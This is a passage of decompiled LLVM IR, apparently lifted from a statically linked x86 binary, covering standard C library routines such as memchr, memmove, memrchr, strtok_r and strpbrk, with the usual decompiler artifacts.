  %v3_80621ba = load i32, i32* %v2_80621ba, align 4
  %v13_80621ba = icmp eq i32 %v3_80621ba, -2
  %v1_80621be = icmp eq i1 %v13_80621ba, false
  br i1 %v1_80621be, label %dec_label_pc_80621c8, label %dec_label_pc_80621c0

dec_label_pc_80621c0:                             ; preds = %dec_label_pc_80621ba
  %v1_80621c0 = or i32 %v2_806218f, 4
  store i32 %v1_80621c0, i32* @ecx, align 4
  %v1_80621c3 = trunc i32 %v1_80621c0 to i16
  %v3_80621c3 = inttoptr i32 %v2_80621c3 to i16*
  store i16 %v1_80621c3, i16* %v3_80621c3, align 2
  br label %dec_label_pc_8062226

dec_label_pc_80621c8:                             ; preds = %dec_label_pc_80621ba
  %v1_80621c8 = udiv i32 %v2_806218f, 256
  %v2_80621c8 = trunc i32 %v1_80621c8 to i8
  %v3_80621c8 = urem i8 %v2_80621c8, 4
  %v4_80621c8 = icmp eq i8 %v3_80621c8, 0
  %v8_80621c8 = zext i8 %v3_80621c8 to i32
  %v10_80621c8 = mul nuw nsw i32 %v8_80621c8, 256
  %v11_80621c8 = urem i32 %v2_806218f, 256
  %v12_80621c8 = or i32 %v10_80621c8, %v11_80621c8
  store i32 %v12_80621c8, i32* %edx.global-to-local, align 4
  br i1 %v4_80621c8, label %dec_label_pc_80621dd, label %dec_label_pc_80621cd

dec_label_pc_80621cd:                             ; preds = %dec_label_pc_80621c8
  %v3_80621d5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8073d7c.702 to i16*))
  %v0_80621dd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80621dd

dec_label_pc_80621dd:                             ; preds = %dec_label_pc_80621c8, %dec_label_pc_80621cd
  %v0_8062212 = phi i32 [ %v2_80621c3, %dec_label_pc_80621c8 ], [ %v0_80621dd.pre, %dec_label_pc_80621cd ]
  %v1_80621dd = add i32 %v0_8062212, 8
  %v2_80621dd = inttoptr i32 %v1_80621dd to i32*
  %v3_80621dd = load i32, i32* %v2_80621dd, align 4
  %v1_80621e0 = add i32 %v0_8062212, 12
  %v2_80621e0 = inttoptr i32 %v1_80621e0 to i32*
  %v3_80621e0 = load i32, i32* %v2_80621e0, align 4
  %v15_80621e0 = icmp eq i32 %v3_80621e0, %v3_80621dd
  br i1 %v15_80621e0, label %dec_label_pc_806220a, label %dec_label_pc_80621e5

dec_label_pc_80621e5:                             ; preds = %dec_label_pc_80621dd
  %v2_80621e8 = add i32 %v0_8062212, 24
  %v3_80621e8 = inttoptr i32 %v2_80621e8 to i32*
  store i32 %v3_80621dd, i32* %v3_80621e8, align 4
  %v0_80621eb = load i32, i32* @ebx, align 4
  %v2_80621ec = call i32 @__stdio_rfill(i32 %v0_80621eb)
  %v1_80621f4 = icmp eq i32 %v2_80621ec, 0
  br i1 %v1_80621f4, label %dec_label_pc_8062226, label %dec_label_pc_80621f8

dec_label_pc_80621f8:                             ; preds = %dec_label_pc_80621e5
  %v0_80621f8 = load i32, i32* @ebx, align 4
  %v1_80621f8 = add i32 %v0_80621f8, 20
  %v2_80621f8 = inttoptr i32 %v1_80621f8 to i32*
  %v3_80621f8 = load i32, i32* %v2_80621f8, align 4
  %v2_80621fb = add i32 %v0_80621f8, 24
  %v3_80621fb = inttoptr i32 %v2_80621fb to i32*
  store i32 %v3_80621f8, i32* %v3_80621fb, align 4
  %v0_80621fe = load i32, i32* @ebx, align 4
  %v1_80621fe = add i32 %v0_80621fe, 16
  %v2_80621fe = inttoptr i32 %v1_80621fe to i32*
  %v3_80621fe = load i32, i32* %v2_80621fe, align 4
  br label %dec_label_pc_8062201

dec_label_pc_8062201:                             ; preds = %dec_label_pc_80621b2, %entry, %dec_label_pc_80621f8
  %v1_8062205 = phi i32 [ %v2_80621c3, %dec_label_pc_80621b2 ], [ %v4_8062158, %entry ], [ %v0_80621fe, %dec_label_pc_80621f8 ]
  %v0_8062201 = phi i32 [ %v3_80621b2, %dec_label_pc_80621b2 ], [ %v3_806215c, %entry ], [ %v3_80621fe, %dec_label_pc_80621f8 ]
  %v1_8062201 = inttoptr i32 %v0_8062201 to i8*
  %v2_8062201 = load i8, i8* %v1_8062201, align 1
  %v3_8062201 = zext i8 %v2_8062201 to i32
  store i32 %v3_8062201, i32* @edx, align 4
  %v1_8062204 = add i32 %v0_8062201, 1
  %v2_8062205 = add i32 %v1_8062205, 16
  %v3_8062205 = inttoptr i32 %v2_8062205 to i32*
  store i32 %v1_8062204, i32* %v3_8062205, align 4
  %v0_8062229.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8062229

dec_label_pc_806220a:                             ; preds = %dec_label_pc_80621dd
  %v2_806220d = ptrtoint i8* %stack_var_-5 to i32
  %v5_8062212 = inttoptr i32 %v0_8062212 to i16*
  %v5_8062213 = call i32 @__stdio_READ(i16* %v5_8062212, i32 %v2_806220d, i32 1)
  %v1_806221b = icmp eq i32 %v5_8062213, 0
  br i1 %v1_806221b, label %dec_label_pc_8062226, label %dec_label_pc_806221f

dec_label_pc_806221f:                             ; preds = %dec_label_pc_806220a
  %v3_806221f = load i8, i8* %stack_var_-5, align 1
  %v4_806221f = sext i8 %v3_806221f to i32
  store i32 %v4_806221f, i32* @edx, align 4
  br label %dec_label_pc_8062229

dec_label_pc_8062226:                             ; preds = %dec_label_pc_8062177, %dec_label_pc_806220a, %dec_label_pc_80621e5, %dec_label_pc_80621c0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8062229

dec_label_pc_8062229:                             ; preds = %dec_label_pc_8062199, %dec_label_pc_806221f, %dec_label_pc_8062201, %dec_label_pc_8062226
  %v0_8062229 = phi i32 [ %v1_80621ad, %dec_label_pc_8062199 ], [ %v4_806221f, %dec_label_pc_806221f ], [ %v0_8062229.pre, %dec_label_pc_8062201 ], [ -1, %dec_label_pc_8062226 ]
  store i32 %v0_8062154, i32* @ebx, align 4
  ret i32 %v0_8062229

; uselistorder directives
  uselistorder i32 %v0_8062201, { 1, 0 }
  uselistorder i32 %v3_80621dd, { 1, 0 }
  uselistorder i32 %v0_8062212, { 0, 1, 3, 2 }
  uselistorder i8 %v3_80621c8, { 1, 0 }
  uselistorder i32 %v3_80621b2, { 1, 0 }
  uselistorder i32 %v1_80621ad, { 1, 0 }
  uselistorder i32 %v2_806218f, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_80621c3, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 3, 0, 1, 2, 4 }
  uselistorder i32 65535, { 0, 7, 3, 1, 6, 2, 8, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_trans2r_o, { 1, 0 }
  uselistorder i32 131, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062229, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8062226, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8062201, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80621dd, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8062230 = load i32, i32* @edi, align 4
  store i32 %v0_8062230, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8062237 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8062237, i32* %edi.global-to-local, align 4
  %v1_806223f = icmp eq i32 %arg3, 0
  store i1 %v1_806223f, i1* %zf.global-to-local, align 1
  br i1 %v1_806223f, label %dec_label_pc_806224f, label %dec_label_pc_8062243

dec_label_pc_8062243:                             ; preds = %entry
  %v2_8062243 = call i32 @_strlen(i8* %arg1)
  %v3_8062243 = mul i32 %v2_8062243, -1
  %v4_8062243 = add i32 %v3_8062243, -2
  store i32 %v4_8062243, i32* @ecx, align 4
  %v0_8062245 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8062245, label %dec_label_pc_8062243.dec_label_pc_806224c_crit_edge, label %dec_label_pc_8062247

dec_label_pc_8062243.dec_label_pc_806224c_crit_edge: ; preds = %dec_label_pc_8062243
  %v0_806224c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_806224c.pre, -1
  br label %dec_label_pc_806224c

dec_label_pc_8062247:                             ; preds = %dec_label_pc_8062243
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_806224c

dec_label_pc_806224c:                             ; preds = %dec_label_pc_8062243.dec_label_pc_806224c_crit_edge, %dec_label_pc_8062247
  %v0_806224c = phi i32 [ %phitmp, %dec_label_pc_8062243.dec_label_pc_806224c_crit_edge ], [ 0, %dec_label_pc_8062247 ]
  %v8_806224c = icmp eq i32 %v0_806224c, 0
  store i1 %v8_806224c, i1* %zf.global-to-local, align 1
  store i32 %v0_806224c, i32* %edi.global-to-local, align 4
  %v2_8062251.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_806224f

dec_label_pc_806224f:                             ; preds = %entry, %dec_label_pc_806224c
  %v2_8062251 = phi i32 [ %v0_8062230, %entry ], [ %v2_8062251.pre, %dec_label_pc_806224c ]
  %v0_806224f = phi i32 [ 0, %entry ], [ %v0_806224c, %dec_label_pc_806224c ]
  store i32 %v2_8062251, i32* @edi, align 4
  ret i32 %v0_806224f

; uselistorder directives
  uselistorder i32 %v0_806224c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_806224f, { 1, 0 }
  uselistorder label %dec_label_pc_806224c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8062255 = load i32, i32* @esi, align 4
  store i32 %v0_8062255, i32* %stack_var_-8, align 4
  %v4_8062256 = ptrtoint i8* %arg1 to i32
  %v9_8062262 = icmp ugt i8* %tmp3, %arg1
  %v1_8062264 = icmp eq i1 %v9_8062262, false
  br i1 %v1_8062264, label %dec_label_pc_806226c, label %dec_label_pc_8062266

dec_label_pc_8062266:                             ; preds = %entry
  %v7_8062268 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8062268 = ptrtoint i8* %v7_8062268 to i32
  store i32 %v8_8062268, i32* @ecx, align 4
  br label %dec_label_pc_8062278

dec_label_pc_806226c:                             ; preds = %entry
  %v3_806226c = add i32 %arg2, -1
  %v4_806226c = add i32 %v3_806226c, %tmp
  %v5_806226c = inttoptr i32 %v4_806226c to i8*
  %v3_8062270 = add i32 %v4_8062256, -1
  %v4_8062270 = add i32 %v3_8062270, %tmp
  %v5_8062270 = inttoptr i32 %v4_8062270 to i8*
  %v7_8062275 = call i8* @_memcpy(i8* %v5_8062270, i8* %v5_806226c, i32 %tmp)
  %v8_8062275 = ptrtoint i8* %v7_8062275 to i32
  store i32 %v8_8062275, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8062278

dec_label_pc_8062278:                             ; preds = %dec_label_pc_8062266, %dec_label_pc_806226c
  %v2_8062278 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062278, i32* @esi, align 4
  ret i32 %v4_8062256

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062278, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_806227c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_806228f = inttoptr i32 %arg1 to i16*
  %v4_806228f = call i32 @memcpy(i16* %v3_806228f, i32 %arg2, i32 %arg3)
  %v0_8062294 = load i32, i32* @esi, align 4
  %v2_8062294 = add i32 %v0_8062294, %arg3
  store i32 %v0_806227c, i32* @esi, align 4
  ret i32 %v2_8062294
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_80622a5 = urem i32 %arg2, 256
  %v4_80622b1 = sext i8 %arg1 to i32
  %v2_80622b5 = add i32 %v4_80622b1, %arg3
  %v1_80622c76 = icmp eq i32 %arg3, 0
  br i1 %v1_80622c76, label %dec_label_pc_80622cf, label %dec_label_pc_80622cb

dec_label_pc_80622b9:                             ; preds = %dec_label_pc_80622cb
  %v1_80622b9 = add i32 %v0_80622b9, -1
  %v5_80622ba = load i32, i32* @edx, align 4
  %v6_80622ba = and i32 %v5_80622ba, -256
  %v7_80622ba = or i32 %v6_80622ba, %v4_80622a5
  store i32 %v7_80622ba, i32* @edx, align 4
  %v1_80622be = inttoptr i32 %v1_80622b9 to i8*
  %v2_80622be = load i8, i8* %v1_80622be, align 1
  %v15_80622be = icmp eq i8 %v2_80622be, %tmp
  br i1 %v15_80622be, label %dec_label_pc_806234c, label %dec_label_pc_80622c6

dec_label_pc_80622c6:                             ; preds = %dec_label_pc_80622b9
  %v1_80622c6 = add i32 %v0_80622c6, -1
  %v8_80622c6 = icmp eq i32 %v1_80622c6, 0
  br i1 %v8_80622c6, label %dec_label_pc_80622cf, label %dec_label_pc_80622cb

dec_label_pc_80622cb:                             ; preds = %entry, %dec_label_pc_80622c6
  %v0_80622c6 = phi i32 [ %v1_80622c6, %dec_label_pc_80622c6 ], [ %arg3, %entry ]
  %v0_80622b9 = phi i32 [ %v1_80622b9, %dec_label_pc_80622c6 ], [ %v2_80622b5, %entry ]
  %v2_80622cb = urem i32 %v0_80622b9, 4
  %v3_80622cb = icmp eq i32 %v2_80622cb, 0
  %v1_80622cd = icmp eq i1 %v3_80622cb, false
  br i1 %v1_80622cd, label %dec_label_pc_80622b9, label %dec_label_pc_80622cf

dec_label_pc_80622cf:                             ; preds = %dec_label_pc_80622c6, %dec_label_pc_80622cb, %entry
  %v0_8062332.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80622c6 ], [ %v0_80622c6, %dec_label_pc_80622cb ]
  %v0_80622d4 = phi i32 [ %v2_80622b5, %entry ], [ %v1_80622b9, %dec_label_pc_80622c6 ], [ %v0_80622b9, %dec_label_pc_80622cb ]
  store i32 %v0_80622d4, i32* @ecx, align 4
  %v2_80622d8 = mul nuw nsw i32 %v4_80622a5, 256
  %v2_80622db = or i32 %v2_80622d8, %v4_80622a5
  %v2_80622df = mul i32 %v2_80622db, 65536
  %v2_80622e2 = or i32 %v2_80622df, %v2_80622db
  %v6_806233552 = icmp ugt i32 %v0_8062332.pr, 3
  br i1 %v6_806233552, label %dec_label_pc_80622e6, label %dec_label_pc_8062337

dec_label_pc_80622e6:                             ; preds = %dec_label_pc_80622cf, %dec_label_pc_806232f
  %v0_806232f54 = phi i32 [ %v1_806232f, %dec_label_pc_806232f ], [ %v0_8062332.pr, %dec_label_pc_80622cf ]
  %v0_80622e653 = phi i32 [ %v1_80622e6, %dec_label_pc_806232f ], [ %v0_80622d4, %dec_label_pc_80622cf ]
  %v1_80622e6 = add i32 %v0_80622e653, -4
  store i32 %v1_80622e6, i32* @ecx, align 4
  %v2_80622eb = inttoptr i32 %v1_80622e6 to i32*
  %v3_80622eb = load i32, i32* %v2_80622eb, align 4
  %v4_80622eb = xor i32 %v3_80622eb, %v2_80622e2
  %v1_80622ed = add i32 %v4_80622eb, 2130640639
  %v1_80622f3 = sub i32 -1, %v4_80622eb
  %v2_80622f5 = xor i32 %v1_80622ed, %v1_80622f3
  %v1_80622f7 = and i32 %v2_80622f5, -2130640640
  %v2_80622f7 = icmp eq i32 %v1_80622f7, 0
  br i1 %v2_80622f7, label %dec_label_pc_806232f, label %dec_label_pc_80622ff

dec_label_pc_80622ff:                             ; preds = %dec_label_pc_80622e6
  %v7_80622ff = or i32 %v1_80622f7, %v4_80622a5
  %v1_8062303 = add i32 %v0_80622e653, -1
  %v2_8062306 = inttoptr i32 %v1_8062303 to i8*
  %v3_8062306 = load i8, i8* %v2_8062306, align 1
  %v16_8062306 = icmp eq i8 %v3_8062306, %tmp
  br i1 %v16_8062306, label %dec_label_pc_806234c, label %dec_label_pc_806230b

dec_label_pc_806230b:                             ; preds = %dec_label_pc_80622ff
  %v1_806230f = add i32 %v0_80622e653, -2
  %v2_8062312 = inttoptr i32 %v1_806230f to i8*
  %v3_8062312 = load i8, i8* %v2_8062312, align 1
  %v16_8062312 = icmp eq i8 %v3_8062312, %tmp
  br i1 %v16_8062312, label %dec_label_pc_806234c, label %dec_label_pc_8062317

dec_label_pc_8062317:                             ; preds = %dec_label_pc_806230b
  %v1_806231b = add i32 %v0_80622e653, -3
  %v2_806231e = inttoptr i32 %v1_806231b to i8*
  %v3_806231e = load i8, i8* %v2_806231e, align 1
  %v16_806231e = icmp eq i8 %v3_806231e, %tmp
  br i1 %v16_806231e, label %dec_label_pc_806234c, label %dec_label_pc_8062323

dec_label_pc_8062323:                             ; preds = %dec_label_pc_8062317
  %v1_8062327 = inttoptr i32 %v1_80622e6 to i8*
  %v2_8062327 = load i8, i8* %v1_8062327, align 1
  %v15_8062327 = icmp eq i8 %v2_8062327, %tmp
  %v1_8062329 = icmp eq i1 %v15_8062327, false
  br i1 %v1_8062329, label %dec_label_pc_806232f, label %dec_label_pc_806232b

dec_label_pc_806232b:                             ; preds = %dec_label_pc_8062323
  br label %dec_label_pc_806234c

dec_label_pc_806232f:                             ; preds = %dec_label_pc_8062323, %dec_label_pc_80622e6
  %v5_806233c26 = phi i32 [ %v7_80622ff, %dec_label_pc_8062323 ], [ 0, %dec_label_pc_80622e6 ]
  %v1_806232f = add i32 %v0_806232f54, -4
  %v6_8062335 = icmp ugt i32 %v1_806232f, 3
  br i1 %v6_8062335, label %dec_label_pc_80622e6, label %dec_label_pc_8062337

dec_label_pc_8062337:                             ; preds = %dec_label_pc_806232f, %dec_label_pc_80622cf
  %v5_806233c25.lcssa = phi i32 [ %v4_80622a5, %dec_label_pc_80622cf ], [ %v5_806233c26, %dec_label_pc_806232f ]
  %v0_80622e6.lcssa = phi i32 [ %v0_80622d4, %dec_label_pc_80622cf ], [ %v1_80622e6, %dec_label_pc_806232f ]
  %v0_806232f.lcssa = phi i32 [ %v0_8062332.pr, %dec_label_pc_80622cf ], [ %v1_806232f, %dec_label_pc_806232f ]
  br label %dec_label_pc_8062344

dec_label_pc_806233b:                             ; preds = %dec_label_pc_8062344
  %v1_8062344 = add i32 %v0_8062344, -1
  %v1_806233b = add i32 %v0_806233b, -1
  %v6_806233c = and i32 %v5_806233c, -256
  %v7_806233c = or i32 %v6_806233c, %v4_80622a5
  %v1_8062340 = inttoptr i32 %v1_806233b to i8*
  %v2_8062340 = load i8, i8* %v1_8062340, align 1
  %v15_8062340 = icmp eq i8 %v2_8062340, %tmp
  br i1 %v15_8062340, label %dec_label_pc_806234c, label %dec_label_pc_8062344

dec_label_pc_8062344:                             ; preds = %dec_label_pc_806233b, %dec_label_pc_8062337
  %v5_806233c = phi i32 [ %v7_806233c, %dec_label_pc_806233b ], [ %v5_806233c25.lcssa, %dec_label_pc_8062337 ]
  %v0_806233b = phi i32 [ %v1_806233b, %dec_label_pc_806233b ], [ %v0_80622e6.lcssa, %dec_label_pc_8062337 ]
  %v0_8062344 = phi i32 [ %v1_8062344, %dec_label_pc_806233b ], [ %v0_806232f.lcssa, %dec_label_pc_8062337 ]
  %v10_8062345 = icmp eq i32 %v0_8062344, 0
  %v1_8062348 = icmp eq i1 %v10_8062345, false
  br i1 %v1_8062348, label %dec_label_pc_806233b, label %dec_label_pc_806234a

dec_label_pc_806234a:                             ; preds = %dec_label_pc_8062344
  br label %dec_label_pc_806234c

dec_label_pc_806234c:                             ; preds = %dec_label_pc_80622b9, %dec_label_pc_8062317, %dec_label_pc_806230b, %dec_label_pc_80622ff, %dec_label_pc_806233b, %dec_label_pc_806232b, %dec_label_pc_806234a
  %v0_806234f = phi i32 [ %v1_80622e6, %dec_label_pc_806232b ], [ 0, %dec_label_pc_806234a ], [ %v1_806233b, %dec_label_pc_806233b ], [ %v1_806231b, %dec_label_pc_8062317 ], [ %v1_806230f, %dec_label_pc_806230b ], [ %v1_8062303, %dec_label_pc_80622ff ], [ %v1_80622b9, %dec_label_pc_80622b9 ]
  ret i32 %v0_806234f

; uselistorder directives
  uselistorder i32 %v0_8062344, { 1, 0 }
  uselistorder i32 %v1_806232f, { 0, 2, 1 }
  uselistorder i32 %v1_80622e6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80622e653, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80622db, { 1, 0 }
  uselistorder i32 %v0_80622b9, { 1, 0, 2 }
  uselistorder i32 %v2_80622b5, { 1, 0 }
  uselistorder i32 %v4_80622a5, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806234c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80622e6, { 1, 0 }
  uselistorder label %dec_label_pc_80622cf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80622cb, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8062350 = load i32, i32* @edi, align 4
  %v0_8062351 = load i32, i32* @esi, align 4
  %v0_8062352 = load i32, i32* @ebx, align 4
  store i32 %v0_8062352, i32* %stack_var_-12, align 4
  %v4_8062353 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8062353, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_806235f = icmp eq i8* %arg1, null
  %v1_8062361 = icmp eq i1 %v1_806235f, false
  br i1 %v1_8062361, label %dec_label_pc_8062365, label %dec_label_pc_8062363

dec_label_pc_8062363:                             ; preds = %entry
  %v1_8062363 = inttoptr i32 %arg3 to i32*
  %v2_8062363 = load i32, i32* %v1_8062363, align 4
  store i32 %v2_8062363, i32* @ebx, align 4
  br label %dec_label_pc_8062365

dec_label_pc_8062365:                             ; preds = %entry, %dec_label_pc_8062363
  %v0_8062368 = phi i32 [ %v4_8062353, %entry ], [ %v2_8062363, %dec_label_pc_8062363 ]
  %v0_8062365 = load i32, i32* @ecx, align 4
  %v5_8062368 = inttoptr i32 %v0_8062368 to i8*
  %v8_8062369 = call i32 @__GI_strspn(i8* %v5_8062368, i32 %arg2, i32 %v0_8062365, i32 %v0_8062365)
  store i32 %v8_8062369, i32* %eax.global-to-local, align 4
  %v0_8062371 = load i32, i32* @ebx, align 4
  %v2_8062371 = add i32 %v0_8062371, %v8_8062369
  store i32 %v2_8062371, i32* @ebx, align 4
  %v1_8062373 = inttoptr i32 %v2_8062371 to i8*
  %v2_8062373 = load i8, i8* %v1_8062373, align 1
  %v3_8062373 = icmp eq i8 %v2_8062373, 0
  %v1_8062376 = icmp eq i1 %v3_8062373, false
  br i1 %v1_8062376, label %dec_label_pc_806237e, label %dec_label_pc_8062378

dec_label_pc_8062378:                             ; preds = %dec_label_pc_8062365
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_806237a = load i32, i32* @esi, align 4
  %v2_806237a = inttoptr i32 %v1_806237a to i32*
  store i32 %v2_8062371, i32* %v2_806237a, align 4
  %v0_80623a8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80623a5

dec_label_pc_806237e:                             ; preds = %dec_label_pc_8062365
  %v0_8062380 = load i32, i32* @edi, align 4
  %v4_8062382 = call i32 @__GI_strpbrk(i8* %v1_8062373, i32 %v0_8062380)
  store i32 %v4_8062382, i32* %eax.global-to-local, align 4
  %v2_806238a = icmp eq i32 %v4_8062382, 0
  %v1_806238c = icmp eq i1 %v2_806238a, false
  br i1 %v1_806238c, label %dec_label_pc_806239d, label %dec_label_pc_806238e

dec_label_pc_806238e:                             ; preds = %dec_label_pc_806237e
  %v0_8062392 = load i32, i32* @ebx, align 4
  %v5_8062392 = inttoptr i32 %v0_8062392 to i8*
  %v8_8062393 = call i32 @rawmemchr(i8* %v5_8062392, i32 0, i32 %v4_8062382, i32 %v4_8062382)
  br label %dec_label_pc_80623a1

dec_label_pc_806239d:                             ; preds = %dec_label_pc_806237e
  %v5_8062382 = inttoptr i32 %v4_8062382 to i8*
  store i8 0, i8* %v5_8062382, align 1
  %v2_80623a0 = add i32 %v4_8062382, 1
  br label %dec_label_pc_80623a1

dec_label_pc_80623a1:                             ; preds = %dec_label_pc_806238e, %dec_label_pc_806239d
  %storemerge = phi i32 [ %v2_80623a0, %dec_label_pc_806239d ], [ %v8_8062393, %dec_label_pc_806238e ]
  %v0_80623a1 = phi i32 [ %v2_80623a0, %dec_label_pc_806239d ], [ %v8_8062393, %dec_label_pc_806238e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80623a1 = load i32, i32* @esi, align 4
  %v2_80623a1 = inttoptr i32 %v1_80623a1 to i32*
  store i32 %v0_80623a1, i32* %v2_80623a1, align 4
  %v0_80623a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80623a3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80623a5

dec_label_pc_80623a5:                             ; preds = %dec_label_pc_8062378, %dec_label_pc_80623a1
  %v0_80623a8 = phi i32 [ %v0_80623a8.pre, %dec_label_pc_8062378 ], [ %v0_80623a3, %dec_label_pc_80623a1 ]
  %v2_80623a5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80623a5, i32* @ebx, align 4
  store i32 %v0_8062351, i32* @esi, align 4
  store i32 %v0_8062350, i32* @edi, align 4
  ret i32 %v0_80623a8

; uselistorder directives
  uselistorder i32 %v4_8062382, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80623a5, { 1, 0 }
  uselistorder label %dec_label_pc_80623a1, { 1, 0 }
  uselistorder label %dec_label_pc_8062365, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80623ad = load i32, i32* @ebx, align 4
  %v2_80623c424 = load i8, i8* %arg1, align 1
  %v4_80623c628 = icmp eq i8 %v2_80623c424, 0
  br i1 %v4_80623c628, label %dec_label_pc_80623ce, label %dec_label_pc_80623ca.lr.ph

dec_label_pc_80623ca.lr.ph:                       ; preds = %entry
  %v3_80623c425 = zext i8 %v2_80623c424 to i32
  %v5_80623c426 = and i32 %v0_80623ad, -256
  %v6_80623c427 = or i32 %v3_80623c425, %v5_80623c426
  %v4_80623b2 = ptrtoint i8* %arg1 to i32
  %v1_80623bd13 = inttoptr i32 %arg2 to i8*
  %v4_80623bd.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80623ca

dec_label_pc_80623b8:                             ; preds = %dec_label_pc_80623ca, %dec_label_pc_80623bc
  %v6_80623bd22 = phi i32 [ %v6_80623bd, %dec_label_pc_80623bc ], [ %v6_80623bd17, %dec_label_pc_80623ca ]
  %v2_80623bd21 = phi i8 [ %v2_80623bd, %dec_label_pc_80623bc ], [ %v2_80623bd14, %dec_label_pc_80623ca ]
  %v0_80623bc20 = phi i32 [ %v1_80623bc, %dec_label_pc_80623bc ], [ %arg2, %dec_label_pc_80623ca ]
  %v15_80623b8 = icmp eq i8 %v2_80623bd21, %v2_80623c431
  br i1 %v15_80623b8, label %dec_label_pc_80623d0, label %dec_label_pc_80623bc

dec_label_pc_80623bc:                             ; preds = %dec_label_pc_80623b8
  %v1_80623bc = add i32 %v0_80623bc20, 1
  store i32 %v1_80623bc, i32* @edx, align 4
  %v1_80623bd = inttoptr i32 %v1_80623bc to i8*
  %v2_80623bd = load i8, i8* %v1_80623bd, align 1
  %v3_80623bd = zext i8 %v2_80623bd to i32
  %v5_80623bd = and i32 %v6_80623bd22, -256
  %v6_80623bd = or i32 %v3_80623bd, %v5_80623bd
  store i32 %v6_80623bd, i32* @ecx, align 4
  %v4_80623bf = icmp eq i8 %v2_80623bd, 0
  %v1_80623c1 = icmp eq i1 %v4_80623bf, false
  br i1 %v1_80623c1, label %dec_label_pc_80623b8, label %dec_label_pc_80623c3

dec_label_pc_80623c3:                             ; preds = %dec_label_pc_80623bc, %dec_label_pc_80623ca
  %v4_80623bd.pre34 = phi i32 [ %v6_80623bd17, %dec_label_pc_80623ca ], [ %v6_80623bd, %dec_label_pc_80623bc ]
  %v1_80623c3 = add i32 %v0_80623c329, 1
  %v1_80623c4 = inttoptr i32 %v1_80623c3 to i8*
  %v2_80623c4 = load i8, i8* %v1_80623c4, align 1
  %v3_80623c4 = zext i8 %v2_80623c4 to i32
  %v5_80623c4 = and i32 %v6_80623c432, -256
  %v6_80623c4 = or i32 %v3_80623c4, %v5_80623c4
  %v4_80623c6 = icmp eq i8 %v2_80623c4, 0
  br i1 %v4_80623c6, label %dec_label_pc_80623ce, label %dec_label_pc_80623ca

dec_label_pc_80623ca:                             ; preds = %dec_label_pc_80623ca.lr.ph, %dec_label_pc_80623c3
  %v4_80623bd.pre = phi i32 [ %v4_80623bd.pre.pre, %dec_label_pc_80623ca.lr.ph ], [ %v4_80623bd.pre34, %dec_label_pc_80623c3 ]
